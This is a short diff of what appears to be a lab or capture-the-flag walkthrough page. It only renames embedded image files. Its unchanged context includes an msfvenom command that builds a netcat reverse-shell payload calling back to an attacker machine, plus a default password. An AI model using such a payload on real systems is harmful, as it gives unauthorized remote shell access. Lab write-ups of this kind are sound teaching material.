@@ -31,7 +31,7 @@ The target's hostname
 
 There are 8 users
 
-<figure><img src="../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 4 shells
 
@@ -133,7 +133,7 @@ Password: password
 msfvenom -p cmd/unix/reverse_netcat lhost=$KALI lport=8888 R
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
